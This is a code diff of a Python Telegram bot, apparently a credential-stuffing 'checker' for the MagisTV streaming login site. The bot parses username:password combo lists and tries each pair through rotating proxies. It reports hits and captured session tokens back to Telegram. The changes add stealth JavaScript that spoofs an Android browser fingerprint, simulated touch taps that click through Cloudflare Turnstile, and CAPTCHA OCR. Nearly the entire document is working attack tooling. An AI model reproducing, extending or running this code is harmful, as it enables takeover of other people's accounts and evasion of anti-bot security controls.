@@ -3,7 +3,7 @@
 """
 ╔══════════════════════════════════════════════════════════════╗
 ║   🎬 Flujo TV — Telegram Bot (VPS + Xvfb)                 ║
-║   headless=False + Diagnóstico CF + Modo Sin Proxy         ║
+║   FIX: UA consistente + Diagnóstico real + Stealth completo  ║
 ╚══════════════════════════════════════════════════════════════╝
 """
 
@@ -31,12 +31,8 @@ if not os.environ.get("DISPLAY"):
     os.environ["DISPLAY"] = ":99"
 
 bot_state = {
-    "running": False,
-    "current_chat": None,
-    "_start_time": None,
-    "_process": None,
-    "debug_sent": 0,
-    "force_no_proxy": False,
+    "running": False, "current_chat": None, "_start_time": None,
+    "_process": None, "debug_sent": 0, "force_no_proxy": False,
 }
 
 def get_proxy_conf():
@@ -52,7 +48,6 @@ def get_proxy_conf():
 
 def tg_api(method, params=None, files=None, timeout=30):
     url = f"https://api.telegram.org/bot{TG_TOKEN}/{method}"
-    data = None
     req = None
     try:
         if files:
@@ -114,8 +109,7 @@ def tg_download_file(file_id):
     file_path = r["result"]["file_path"]
     dl_url = f"https://api.telegram.org/file/bot{TG_TOKEN}/{file_path}"
     try:
-        with urllib.request.urlopen(dl_url, timeout=60) as resp:
-            return resp.read()
+        with urllib.request.urlopen(dl_url, timeout=60) as resp: return resp.read()
     except: return None
 
 def escape_html(t):
@@ -186,8 +180,7 @@ def parse_combo(text):
         parts = re.split(r"[:;|,\s]+", line, maxsplit=1)
         if len(parts) == 2 and parts[0] and parts[1]:
             u, p = parts[0].strip(), parts[1].strip()
-            if len(u) <= 35 and len(p) <= 60:
-                accounts.append((u, p))
+            if len(u) <= 35 and len(p) <= 60: accounts.append((u, p))
     return accounts
 
 # ════════════════════════════════════════════════════════════════════════
@@ -216,56 +209,183 @@ def get_captcha_img(page):
     return None
 
 # ════════════════════════════════════════════════════════════════════════
-#  STEALTH + MOUSE + CF
+#  STEALTH JS COMPLETO — Fingerprint consistente ANDROID
 # ════════════════════════════════════════════════════════════════════════
 
 STEALTH_JS = """
+// === NUCLEO: Ocultar automatización ===
 Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
-Object.defineProperty(navigator, 'languages', {get: () => ['es-ES', 'es', 'en-US', 'en']});
+delete navigator.__proto__.webdriver;
+
+// === CONSISTENCIA ANDROID MOBILE ===
 Object.defineProperty(navigator, 'platform', {get: () => 'Linux armv81'});
-window.chrome = {runtime: {}, loadTimes: function(){}, csi: function(){}};
+Object.defineProperty(navigator, 'userAgentData', {get: () => undefined});
+Object.defineProperty(navigator, 'vendor', {get: () => 'Google Inc.'});
+Object.defineProperty(navigator, 'appVersion', {get: () => '5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'});
+Object.defineProperty(navigator, 'maxTouchPoints', {get: () => 5});
+Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8});
+Object.defineProperty(navigator, 'deviceMemory', {get: () => 4});
+
+// === Languages ===
+Object.defineProperty(navigator, 'languages', {get: () => ['es-ES', 'es', 'en-US', 'en']});
+Object.defineProperty(navigator, 'language', {get: () => 'es-ES'});
+
+// === Chrome Runtime (mobile) ===
+window.chrome = {runtime: {}, loadTimes: function(){}, csi: function(){}, app: {}};
+
+// === Plugins (Android Chrome tiene 5 plugins) ===
+Object.defineProperty(navigator, 'plugins', {
+    get: () => {
+        const plugins = [
+            {name:'Chrome PDF Plugin', filename:'internal-pdf-viewer', description:'Portable Document Format', length:1},
+            {name:'Chrome PDF Viewer', filename:'mhjfbmdgcfjbbpaeojofohoefgiehjai', description:'', length:1},
+            {name:'Native Client', filename:'internal-nacl-plugin', description:'', length:2},
+        ];
+        plugins.refresh = function(){};
+        return plugins;
+    }
+});
+
+// === MIME Types ===
+Object.defineProperty(navigator, 'mimeTypes', {
+    get: () => {
+        const mimes = [
+            {type:'application/pdf', suffixes:'pdf', description:'Portable Document Format'},
+            {type:'application/x-nacl', suffixes:'', description:'Native Client Executable'},
+            {type:'application/x-pnacl', suffixes:'', description:'Portable Native Client Executable'},
+        ];
+        mimes.refresh = function(){};
+        return mimes;
+    }
+});
+
+// === Permissions ===
 const originalQuery = window.navigator.permissions.query;
 window.navigator.permissions.query = (parameters) =>
     parameters.name === 'notifications'
         ? Promise.resolve({state: Notification.permission})
         : originalQuery(parameters);
-Object.defineProperty(navigator, 'plugins', {
-    get: () => [1, 2, 3, 4, 5].map(() => ({
-        name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer',
-        description: 'Portable Document Format', length: 1
-    }))
-});
-const getParameter = WebGLRenderingContext.prototype.getParameter;
+
+// === WebGL (Adreno 640 — GPU real de Android) ===
+const getParam = WebGLRenderingContext.prototype.getParameter;
 WebGLRenderingContext.prototype.getParameter = function(parameter) {
-    if (parameter === 37445) return 'Intel Inc.';
-    if (parameter === 37446) return 'Intel Iris OpenGL Engine';
-    return getParameter.call(this, parameter);
+    if (parameter === 37445) return 'Qualcomm';
+    if (parameter === 37446) return 'Adreno (TM) 640';
+    if (parameter === 7936) return ['WebGL 1.0 (OpenGL ES 2.0 Chromium)'];
+    if (parameter === 7937) return ['WebGL GLSL ES 1.0 (OpenGL ES GLSL ES 1.0 Chromium)'];
+    if (parameter === 7938) return 'WebKit';
+    if (parameter === 35724) return 'WebGL 1.0 (OpenGL ES 2.0 Chromium)';
+    return getParam.call(this, parameter);
 };
-window._mx = 210; window._my = 450;
-document.addEventListener('mousemove', e => { window._mx = e.clientX; window._my = e.clientY; });
-const elementDescriptor = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, 'contentWindow');
-Object.defineProperty(HTMLIFrameElement.prototype, 'contentWindow', {
-    get: function() { try { return elementDescriptor.get.call(this); } catch(e) { return null; } }
+const getParam2 = WebGL2RenderingContext.prototype.getParameter;
+WebGL2RenderingContext.prototype.getParameter = function(parameter) {
+    if (parameter === 37445) return 'Qualcomm';
+    if (parameter === 37446) return 'Adreno (TM) 640';
+    return getParam2.call(this, parameter);
+};
+
+// === Canvas fingerprint noise ===
+const origGetContext = HTMLCanvasElement.prototype.getContext;
+HTMLCanvasElement.prototype.getContext = function(type, attributes) {
+    const ctx = origGetContext.call(this, type, attributes);
+    if (type === '2d' && ctx) {
+        const origGetImageData = ctx.getImageData.bind(ctx);
+        ctx.getImageData = function(sx, sy, sw, sh) {
+            const imageData = origGetImageData(sx, sy, sw, sh);
+            for (let i = 0; i < imageData.data.length; i += 4) {
+                imageData.data[i] ^= (Math.random() * 2) | 0;
+            }
+            return imageData;
+        };
+    }
+    return ctx;
+};
+
+// === Connection (4G mobile) ===
+Object.defineProperty(navigator, 'connection', {
+    get: () => ({
+        effectiveType: '4g', rtt: 50, downlink: 10, saveData: false,
+        type: 'cellular', ontypechange: null, onchange: null, addEventListener: function(){},
+        removeEventListener: function(){}, dispatchEvent: function(){ return true; }
+    })
 });
+
+// === Screen (Samsung Galaxy S10) ===
+Object.defineProperty(screen, 'width', {get: () => 412});
+Object.defineProperty(screen, 'height', {get: () => 915});
+Object.defineProperty(screen, 'availWidth', {get: () => 412});
+Object.defineProperty(screen, 'availHeight', {get: () => 872});
+Object.defineProperty(screen, 'colorDepth', {get: () => 24});
+Object.defineProperty(screen, 'pixelDepth', {get: () => 24});
+Object.defineProperty(window, 'devicePixelRatio', {get: () => 2.625});
+Object.defineProperty(window, 'innerWidth', {get: () => 412});
+Object.defineProperty(window, 'innerHeight', {get: () => 872});
+Object.defineProperty(window, 'outerWidth', {get: () => 412});
+Object.defineProperty(window, 'outerHeight', {get: () => 872});
+
+// === Mouse tracking para human_click ===
+window._mx = 200; window._my = 400;
+document.addEventListener('mousemove', e => { window._mx = e.clientX; window._my = e.clientY; });
+document.addEventListener('touchmove', e => {
+    if(e.touches[0]){ window._mx = e.touches[0].clientX; window._my = e.touches[0].clientY; }
+});
+
+// === Iframe fix ===
+try {
+    const ed = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, 'contentWindow');
+    Object.defineProperty(HTMLIFrameElement.prototype, 'contentWindow', {
+        get: function() { try { return ed.get.call(this); } catch(e) { return null; } }
+    });
+} catch(e) {}
+
+// === Notification permission ===
+Object.defineProperty(Notification, 'permission', {get: () => 'default'});
 """
 
-def human_click(page, x, y):
-    steps = random.randint(20, 40)
-    try: cur = page.evaluate("()=>({x:window._mx||210,y:window._my||450})")
-    except: cur = {"x": 210, "y": 450}
+# ════════════════════════════════════════════════════════════════════════
+#  MOUSE HUMANO (TOUCH PARA MOBILE)
+# ════════════════════════════════════════════════════════════════════════
+
+def human_tap(page, x, y):
+    """Simula toque de dedo en móvil"""
+    steps = random.randint(8, 15)
+    try: cur = page.evaluate("()=>({x:window._mx||200,y:window._my||400})")
+    except: cur = {"x": 200, "y": 400}
     cx, cy = cur["x"], cur["y"]
     for i in range(steps):
         p = i / steps
-        page.mouse.move(cx+(x-cx)*p+random.gauss(0,2), cy+(y-cy)*p+random.gauss(0,2))
-        time.sleep(random.uniform(0.003, 0.012))
-    page.mouse.click(x+random.uniform(-1,1), y+random.uniform(-1,1))
-    time.sleep(random.uniform(0.2, 0.5))
+        nx = cx + (x - cx) * p + random.gauss(0, 1.5)
+        ny = cy + (y - cy) * p + random.gauss(0, 1.5)
+        page.touch.move(nx, ny)
+        time.sleep(random.uniform(0.005, 0.02))
+    page.touch.move(x + random.uniform(-0.5, 0.5), y + random.uniform(-0.5, 0.5))
+    time.sleep(random.uniform(0.05, 0.15))
+    page.tap(x + random.uniform(-1, 1), y + random.uniform(-1, 1))
+    time.sleep(random.uniform(0.3, 0.8))
 
 def _has_login(page):
-    try: return page.locator("input[type='text']").count() > 0
-    except: return False
+    """Verifica que el FORMULARIO DE LOGIN real esté visible, no el de CF"""
+    try:
+        # Buscar inputs que NO estén dentro de iframes de CF
+        inputs = page.locator("input[type='text']").all()
+        for inp in inputs:
+            try:
+                if inp.is_visible(timeout=200):
+                    # Verificar que no esté en un iframe de cloudflare
+                    box = inp.bounding_box()
+                    if box and box["y"] > 200:  # El login real está más abajo
+                        placeholder = inp.get_attribute("placeholder") or ""
+                        if "user" in placeholder.lower() or "usuario" in placeholder.lower() or not placeholder:
+                            return True
+            except: continue
+        # Fallback: si hay input de password visible, el login cargó
+        pw = page.locator("input[type='password']").first
+        if pw.is_visible(timeout=300):
+            return True
+    except: pass
+    return False
 
-def solve_turnstile(page, max_a=8):
+def solve_turnstile(page, max_a=10):
     for att in range(1, max_a+1):
         try:
             for ifr in page.locator("iframe").all():
@@ -274,22 +394,23 @@ def solve_turnstile(page, max_a=8):
                 if "challenges.cloudflare.com" in src or "turnstile" in tit.lower():
                     box = ifr.bounding_box()
                     if box and box["width"] > 0:
-                        page.mouse.move(box["x"]+random.randint(50,150), box["y"]+random.randint(-80,80))
-                        time.sleep(random.uniform(0.5, 1.0))
-                        human_click(page, box["x"]+28, box["y"]+box["height"]/2)
+                        # Simular movimiento de dedo antes del tap
+                        page.touch.move(box["x"]+random.randint(30,120), box["y"]+random.randint(-40,40))
+                        time.sleep(random.uniform(0.3, 0.8))
+                        human_tap(page, box["x"]+28, box["y"]+box["height"]/2)
                         page.wait_for_timeout(5000)
                         if _has_login(page): return True
         except: pass
         try:
             for frame in page.frames:
                 if "challenges.cloudflare.com" in (frame.url or ""):
-                    for sel in [".mark","label",".cb-lb","input[type='checkbox']"]:
+                    for sel in [".mark", "label", ".cb-lb", "input[type='checkbox']", "body"]:
                         try:
                             el = frame.locator(sel).first
                             if el.is_visible(timeout=500):
                                 box = el.bounding_box()
                                 if box:
-                                    human_click(page, box["x"]+box["width"]/2, box["y"]+box["height"]/2)
+                                    human_tap(page, box["x"]+box["width"]/2, box["y"]+box["height"]/2)
                                     page.wait_for_timeout(5000)
                                     if _has_login(page): return True
                         except: pass
@@ -298,26 +419,28 @@ def solve_turnstile(page, max_a=8):
     return False
 
 def handle_cf(page, chat_id=None):
-    page.wait_for_timeout(3000)
+    page.wait_for_timeout(4000)
     if _has_login(page): return True
+
+    # Esperar a que aparezca el iframe de Turnstile
     has_ts = False
-    try:
-        for f in page.locator("iframe").all():
-            s = f.get_attribute("src") or ""; t = f.get_attribute("title") or ""
-            if "challenges.cloudflare.com" in s or "turnstile" in t.lower(): has_ts = True; break
-    except: pass
-    if not has_ts:
-        for _ in range(20):
-            page.wait_for_timeout(1000)
-            if _has_login(page): return True
-            try:
-                for fr in page.frames:
-                    if "challenges.cloudflare.com" in (fr.url or ""): has_ts = True; break
-            except: pass
+    for _ in range(25):
+        try:
+            for f in page.locator("iframe").all():
+                s = f.get_attribute("src") or ""; t = f.get_attribute("title") or ""
+                if "challenges.cloudflare.com" in s or "turnstile" in t.lower():
+                    has_ts = True; break
             if has_ts: break
+        except: pass
+        page.wait_for_timeout(1000)
+        if _has_login(page): return True
+
     if has_ts:
+        print("  [🛡️] Turnstile detectado — resolviendo...")
         if solve_turnstile(page): return True
-    for _ in range(20):
+
+    # Última espera
+    for _ in range(15):
         page.wait_for_timeout(1000)
         if _has_login(page): return True
     return False
@@ -376,18 +499,17 @@ def check_ip_fast(context):
         return "?"
 
 def send_debug_screenshot(page, chat_id, label="debug"):
-    if bot_state.get("debug_sent", 0) >= 3: return
+    if bot_state.get("debug_sent", 0) >= 5: return
     try:
         path = os.path.join(SCREENSHOT_DIR, f"{label}_{int(time.time())}.png")
         page.screenshot(path=path, full_page=False)
         with open(path, "rb") as f: img_data = f.read()
         title = page.title() or "?"; url = page.url or "?"
-        caption = f"🐛 <b>Debug:</b> {label}\n📄 {escape_html(title)}\n🔗 {escape_html(url)}"
+        caption = f"🐛 <b>{label}</b>\n📄 {escape_html(title)}\n🔗 {escape_html(url)}"
         tg_send_photo(chat_id, img_data, caption=caption)
         bot_state["debug_sent"] = bot_state.get("debug_sent", 0) + 1
         os.remove(path)
-    except Exception as e:
-        print(f"  [!] Screenshot error: {e}")
+    except: pass
 
 def update_progress(chat_id, msg_id, account_name, result_str, stats):
     try:
@@ -402,81 +524,78 @@ def update_progress(chat_id, msg_id, account_name, result_str, stats):
         filled = int(bar_len * pct / 100)
         bar = "█" * filled + "░" * (bar_len - filled)
         txt = (
-            f"🎬 <b>Flujo TV Checker</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🎬 <b>Flujo TV</b>\n"
             f"[{bar}] {pct:.0f}%\n"
-            f"📊 {stats['processed']}/{stats['total']}\n"
-            f"💰 Hits: <b>{stats['hits']}</b>\n"
-            f"❌ Fails: {stats['fails']}\n"
-            f"⚡ {speed:.1f}/s │ ⏱ ETA: {eta_str}\n"
-            f"━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🔄 <code>{escape_html(account_name)}</code>\n"
-            f"   {result_str}\n"
-            f"━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🌐 IP: {stats.get('ip','?')}"
+            f"📊 {stats['processed']}/{stats['total']} │ 💰<b>{stats['hits']}</b> │ ❌{stats['fails']}\n"
+            f"⚡ {speed:.1f}/s │ ⏱ {eta_str}\n"
+            f"━━━━━━━━━━━━━━━━\n"
+            f"<code>{escape_html(account_name)}</code>\n"
+            f"  {result_str}\n"
+            f"🌐 {stats.get('ip','?')}"
         )
         tg_edit_msg(chat_id, msg_id, txt, reply_markup=kb_cancel())
     except: pass
 
 # ════════════════════════════════════════════════════════════════════════
-#  DIAGNÓSTICO CF
+#  DIAGNÓSTICO CF REAL
 # ════════════════════════════════════════════════════════════════════════
 
 def test_cf_diagnostic(chat_id):
     from playwright.sync_api import sync_playwright
-    UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
-    tg_send_msg(chat_id, "🔬 Ejecutando diagnóstico de Cloudflare (con proxy)...")
-    
+    tg_send_msg(chat_id, "🔬 Diagnosticando Cloudflare... (espera ~40s)")
     try:
         with sync_playwright() as p:
-            browser = p.chromium.launch(headless=False, args=["--no-sandbox", "--disable-blink-features=AutomationControlled"])
+            browser = p.chromium.launch(headless=False, args=["--no-sandbox","--disable-blink-features=AutomationControlled"])
             ctx_kw = {
-                "user_agent": UA,
-                "viewport": {"width": 420, "height": 900},
+                "user_agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
+                "viewport": {"width": 412, "height": 915},
+                "is_mobile": True, "has_touch": True,
+                "screen": {"width": 412, "height": 915},
+                "device_scale_factor": 2.625,
                 "proxy": get_proxy_conf(),
-                "extra_http_headers": {"Accept-Language": "es-ES,es;q=0.9"}
+                "extra_http_headers": {"Accept-Language": "es-ES,es;q=0.9"},
             }
             context = browser.new_context(**ctx_kw)
             context.add_init_script(STEALTH_JS)
             page = context.new_page()
-            
+
             error_msg = "Ninguno"
             try:
-                resp = page.goto("https://vip.magistv.net/mobile/login", wait_until="domcontentloaded", timeout=30000)
-                page.wait_for_timeout(5000)
+                page.goto("https://vip.magistv.net/mobile/login", wait_until="domcontentloaded", timeout=30000)
             except Exception as e:
                 error_msg = str(e)[:150]
-                
-            title = page.title() or "?"
-            url = page.url or "?"
-            has_iframes = page.locator("iframe").count()
-            has_inputs = page.locator("input").count()
-            
+
+            # Esperar HASTA 35 segundos para que Turnstile se resuelva
+            title = "?"; url = "?"; login_ok = False
+            for sec in range(35):
+                page.wait_for_timeout(1000)
+                title = page.title() or "?"
+                url = page.url or "?"
+                if _has_login(page):
+                    login_ok = True
+                    break
+
             path = os.path.join(SCREENSHOT_DIR, "diag.png")
             page.screenshot(path=path)
             with open(path, "rb") as f: img_data = f.read()
             os.remove(path)
-            
-            is_ok = "login" in url.lower() and has_inputs > 0
-            
-            if is_ok:
-                result_txt = "🟢 <b>ÉXITO</b>\nEl proxy PASA Cloudflare correctamente."
-            else:
-                result_txt = "🔴 <b>FALLÓ</b>\nEl proxy NO puede cargar la página."
-                if "terminated prematurely" in error_msg.lower() or "incomplete read" in error_msg.lower():
-                    result_txt += "\n\n⚠️ <b>DIAGNÓSTICO:</b> Tu proxy está cortando la conexión a medio cargar (incomplete read). Cloudflare necesita cargar scripts pesados y tu proxy los bloquea.\n\n<b>Solución:</b>\n1. Contacta a tu proveedor de proxy y pide uno que soporte Cloudflare Turnstile\n2. Cambia de proveedor (ej: BrightData, IPRoyal)"
-                elif "timeout" in error_msg.lower():
-                    result_txt += "\n\n⚠️ El proxy tardó demasiado y dio timeout."
-                elif "err_proxy" in error_msg.lower() or "407" in error_msg:
-                    result_txt += "\n\n⚠️ Credenciales de proxy incorrectas o no autorizadas."
 
-            caption = f"{result_txt}\n\n📄 Title: <code>{escape_html(title)}</code>\n🔗 URL: <code>{escape_html(url)}</code>\n🖼 Iframes: {has_iframes} | Inputs: {has_inputs}\n❌ Error: <code>{escape_html(error_msg)}</code>"
-            
+            if login_ok:
+                result = "🟢 <b>CF RESUELTO CORRECTAMENTE</b>\nEl login está visible. El proxy + stealth funcionan."
+            elif "incompatible" in title.lower() or "incompatible" in error_msg.lower():
+                result = "🔴 <b>BLOQUEADO: Incompatible</b>\nCF detectó automatización. El fingerprint del navegador no es creíble."
+            elif "un momento" in title.lower() or "verificación" in title.lower():
+                result = "🟡 <b>CF NO SE RESOLVIÓ</b>\nTurnstile cargó pero no pasó. Puede ser timing o el click no llegó."
+            elif "terminated" in error_msg.lower() or "incomplete" in error_msg.lower():
+                result = "🔴 <b>PROXY CORTA CONEXIÓN</b>\nEl proxy tira la conexión antes de que CF cargue."
+            else:
+                result = "🟡 <b>SIN RESULTADO CLARO</b>"
+
+            caption = f"{result}\n\n⏱ Esperó: {min(35, sec+1)}s\n📄 Title: <code>{escape_html(title)}</code>\n🔗 URL: <code>{escape_html(url)}</code>\n❌ Error: <code>{escape_html(error_msg)}</code>"
             tg_send_photo(chat_id, img_data, caption)
             browser.close()
-            
     except Exception as e:
-        tg_send_msg(chat_id, f"❌ Error crítico en diagnóstico:\n<code>{escape_html(str(e))}</code>")
+        tg_send_msg(chat_id, f"❌ Error: <code>{escape_html(str(e))}</code>")
 
 # ════════════════════════════════════════════════════════════════════════
 #  MOTOR DE CHECK
@@ -484,33 +603,28 @@ def test_cf_diagnostic(chat_id):
 
 def run_checker(accounts, chat_id, msg_id, use_proxy):
     from playwright.sync_api import sync_playwright
-    hits = []
-    hits_lines = []
-    errors = {}
-    processed = 0
-    fails = 0
+    hits, hits_lines, errors = [], [], {}
+    processed = fails = 0
     start_time = time.time()
     bot_state["debug_sent"] = 0
-    stats = {
-        "total": len(accounts), "hits": 0, "fails": 0,
-        "processed": 0, "start_time": start_time, "ip": "VPS Directa" if not use_proxy else "?",
-    }
+    stats = {"total": len(accounts), "hits": 0, "fails": 0, "processed": 0, "start_time": start_time, "ip": "VPS" if not use_proxy else "?"}
     ocr_engine = init_ocr()
     use_ocr = ocr_engine is not None
-    UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+
+    # ★★★ UA CONSISTENTE CON ANDROID MOBILE ★★★
+    UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36"
 
     with sync_playwright() as p:
         browser = p.chromium.launch(
             headless=False,
-            args=["--disable-blink-features=AutomationControlled","--no-sandbox","--disable-dev-shm-usage","--disable-infobars","--window-size=420,900","--no-first-run","--no-default-browser-check","--disable-extensions"],
+            args=["--disable-blink-features=AutomationControlled","--no-sandbox","--disable-dev-shm-usage","--disable-infobars","--window-size=412,915","--no-first-run","--no-default-browser-check","--disable-extensions"],
         )
-        idx = 0
-        batch_num = 0
+        idx = batch_num = 0
         consecutive_cf_fails = 0
 
         while idx < len(accounts):
             if os.path.exists(STOP_FILE):
-                try: tg_edit_msg(chat_id, msg_id, "⏹ <b>Detenido por usuario</b>", reply_markup=kb_main())
+                try: tg_edit_msg(chat_id, msg_id, "⏹ <b>Detenido</b>", reply_markup=kb_main())
                 except: pass
                 try: browser.close()
                 except: pass
@@ -518,20 +632,28 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
 
             batch_num += 1
             batch_end = min(idx + ROTATE_EVERY, len(accounts))
+
+            # ★★★ CONTEXTO 100% CONSISTENTE ANDROID ★★★
             ctx_kw = {
-                "user_agent": UA, "viewport": {"width": 420, "height": 900},
-                "is_mobile": True, "has_touch": True, "screen": {"width": 420, "height": 900}, "device_scale_factor": 2.5,
+                "user_agent": UA,
+                "viewport": {"width": 412, "height": 915},
+                "is_mobile": True, "has_touch": True,
+                "screen": {"width": 412, "height": 915},
+                "device_scale_factor": 2.625,
                 "extra_http_headers": {
                     "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Upgrade-Insecure-Requests": "1",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                    "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
+                    "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1",
+                    "Upgrade-Insecure-Requests": "1",
+                    "Sec-CH-UA-Platform": '"Android"',
+                    "Sec-CH-UA-Mobile": "?1",
+                    "Sec-CH-UA": '"Not A(Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
                 },
             }
-            if use_proxy:
-                ctx_kw["proxy"] = get_proxy_conf()
+            if use_proxy: ctx_kw["proxy"] = get_proxy_conf()
 
-            context = None
-            page = None
+            context = page = None
             try:
                 context = browser.new_context(**ctx_kw)
                 context.add_init_script(STEALTH_JS)
@@ -539,31 +661,25 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
             except Exception as e:
                 fails += (batch_end - idx); processed += (batch_end - idx)
                 stats["fails"] = fails; stats["processed"] = processed
-                update_progress(chat_id, msg_id, f"Batch {batch_num}", f"Ctx error: {str(e)[:40]}", stats)
+                update_progress(chat_id, msg_id, f"Batch {batch_num}", f"Ctx: {str(e)[:30]}", stats)
                 idx = batch_end; continue
 
-            nav_ok = False
+            nav_ok = nav_error = False
             nav_error = ""
-            for attempt in range(3):
+            for _ in range(3):
                 try:
                     page.goto("https://vip.magistv.net/mobile/login", wait_until="domcontentloaded", timeout=45000)
                     nav_ok = True; break
                 except Exception as e:
-                    nav_error = str(e)[:100]
-                    time.sleep(3)
+                    nav_error = str(e)[:100]; time.sleep(3)
 
             if not nav_ok:
                 fails += (batch_end - idx); processed += (batch_end - idx)
                 stats["fails"] = fails; stats["processed"] = processed
-                update_progress(chat_id, msg_id, f"Batch {batch_num}", f"Nav fail", stats)
+                update_progress(chat_id, msg_id, f"Batch {batch_num}", "Nav fail", stats)
                 consecutive_cf_fails += 1
-                try:
-                    send_debug_screenshot(page, chat_id, f"nav_fail_b{batch_num}")
-                    tg_send_msg(chat_id, f"🐛 <b>Nav Fail B{batch_num}</b>\n<code>{escape_html(nav_error)}</code>", disable_notification=True)
-                except: pass
-                if consecutive_cf_fails >= 2:
-                    tg_send_msg(chat_id, "⚠️ Fallo consecutivo — pausa 10s", disable_notification=True)
-                    time.sleep(10); consecutive_cf_fails = 0
+                send_debug_screenshot(page, chat_id, f"nav_b{batch_num}")
+                if consecutive_cf_fails >= 2: time.sleep(15); consecutive_cf_fails = 0
                 idx = batch_end
                 try: context.close()
                 except: pass
@@ -575,23 +691,17 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
                 stats["fails"] = fails; stats["processed"] = processed
                 update_progress(chat_id, msg_id, f"Batch {batch_num}", "CF fail", stats)
                 consecutive_cf_fails += 1
-                try:
-                    send_debug_screenshot(page, chat_id, f"cf_fail_b{batch_num}")
-                except: pass
-                if consecutive_cf_fails >= 2:
-                    tg_send_msg(chat_id, "⚠️ CF Fail consecutivo — pausa 15s", disable_notification=True)
-                    time.sleep(15); consecutive_cf_fails = 0
+                send_debug_screenshot(page, chat_id, f"cf_b{batch_num}")
+                if consecutive_cf_fails >= 2: time.sleep(20); consecutive_cf_fails = 0
                 idx = batch_end
                 try: context.close()
                 except: pass
                 continue
 
             consecutive_cf_fails = 0
-
             if use_proxy:
-                ip = check_ip_fast(context)
-                stats["ip"] = ip
-                print(f"  [🔄] Batch {batch_num} — IP: {ip}")
+                ip = check_ip_fast(context); stats["ip"] = ip
+                print(f"  [🔄] B{batch_num} IP:{ip}")
             else:
                 stats["ip"] = "VPS"
 
@@ -604,15 +714,13 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
                     try:
                         if "/api/v1/magis/codigo" in url and resp.status == 200:
                             d = resp.json()
-                            if d.get("code") == 200:
-                                st["cap_uuid"] = d["data"]["uuid"]; st["cap_b64"] = d["data"]["data"]
+                            if d.get("code") == 200: st["cap_uuid"] = d["data"]["uuid"]; st["cap_b64"] = d["data"]["data"]
                     except: pass
                     try:
                         if "/api/v1/magis/info" in url and resp.status == 200:
                             d = resp.json()
                             if d.get("code") == 200 and d.get("data"): st["info"] = d["data"]
-                            elif "restrin" in d.get("msg", "").lower():
-                                st["login_code"] = d.get("code", 500); st["login_msg"] = d.get("msg", ""); st["api_hit"] = True
+                            elif "restrin" in d.get("msg", "").lower(): st["login_code"] = d.get("code", 500); st["login_msg"] = d.get("msg", ""); st["api_hit"] = True
                     except: pass
                     try:
                         if "/api/v1/magis/dashboard" in url and resp.status == 200:
@@ -625,14 +733,12 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
                         after_click = st.get("clicked_at", 0) > 0 and (time.time() - st["clicked_at"]) < 15
                         if (is_login or after_click) and not st.get("api_hit") and not any(n in url for n in NON_LOGIN):
                             try:
-                                d = resp.json()
-                                st["api_hit"] = True; st["login_code"] = d.get("code", resp.status); st["login_msg"] = d.get("msg", "")
+                                d = resp.json(); st["api_hit"] = True; st["login_code"] = d.get("code", resp.status); st["login_msg"] = d.get("msg", "")
                                 if d.get("code") == 200:
                                     st["login_ok"] = True
                                     tok = d.get("data", {}).get("token") if isinstance(d.get("data"), dict) else None
                                     if tok: st["token"] = tok
-                            except:
-                                st["api_hit"] = True; st["login_code"] = resp.status
+                            except: st["api_hit"] = True; st["login_code"] = resp.status
                 return on_resp
 
             page.on("response", make_on_resp(state))
@@ -641,51 +747,48 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
             for local_i in range(batch_end - idx):
                 if os.path.exists(STOP_FILE): break
                 user, pwd = accounts[idx]
-                processed += 1
-                stats["processed"] = processed
+                processed += 1; stats["processed"] = processed
                 state.clear()
-                state.update({"cap_uuid": None, "cap_b64": None, "info": None, "dashboard": None, "token": None, "login_ok": False, "login_msg": "", "login_code": -1, "api_hit": False, "clicked_at": 0})
+                state.update({"cap_uuid":None,"cap_b64":None,"info":None,"dashboard":None,"token":None,"login_ok":False,"login_msg":"","login_code":-1,"api_hit":False,"clicked_at":0})
                 clear_auth(context)
 
-                try:
-                    page.goto("https://vip.magistv.net/mobile/login", wait_until="domcontentloaded", timeout=25000)
+                try: page.goto("https://vip.magistv.net/mobile/login", wait_until="domcontentloaded", timeout=25000)
                 except:
                     try: page.goto("https://vip.magistv.net/mobile/login", wait_until="domcontentloaded", timeout=25000)
                     except:
-                        fails += 1; stats["fails"] = fails; reason = "Nav error"; errors[reason] = errors.get(reason, 0) + 1
-                        update_progress(chat_id, msg_id, user, reason, stats); idx += 1; continue
+                        fails += 1; stats["fails"] += 1; errors["Nav"] = errors.get("Nav",0)+1
+                        update_progress(chat_id, msg_id, user, "Nav error", stats); idx += 1; continue
 
-                page.wait_for_timeout(1200)
+                page.wait_for_timeout(1000)
                 if not _has_login(page):
